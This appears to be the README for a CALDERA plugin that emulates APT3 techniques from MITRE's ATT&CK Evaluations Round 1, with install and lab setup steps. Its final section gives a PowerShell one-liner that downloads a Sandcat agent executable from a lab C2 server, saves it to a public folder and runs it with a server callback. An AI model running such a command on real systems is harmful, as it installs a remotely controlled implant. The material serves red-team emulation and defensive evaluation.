# CALDERA plugin: Eval

## Overview

A plugin supplying CALDERA with the TTPs used within the ATT&CK Evaluations Round 1 (APT3).
For more information see https://attackevals.mitre.org/about-attack-evaluations.html

1. Plugin Installation
2. Lab Setup
3. Execution

## Installation
Clone the Eval plugin into the caldera/plugin directory
```commandline
git clone https://github.com/mitre-attack/evals_caldera.git
```
Add Eval plugin to CALDERA config `conf/local.yml`
```yaml
plugins:
  - evals_caldera
```

Fill out facts in `data/facts/` specific to your setup.

## Environment Setup
[Full Round 1 Environment](https://attackevals.mitre.org/methodology/round1/environment.html)

Minimum requirements:
- Initial host exists within a windows domain
- Remote shared drive is mounted

## Execution

Please read the [full documentation](https://github.com/mitre/caldera/wiki/Plugins-evals) for this plugin.

## Shire Mordor Environment Execution

For use within the Shire Mordor environment deploy 54ndc47 using the following PowerShell command: 
```commandline
$url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;

```
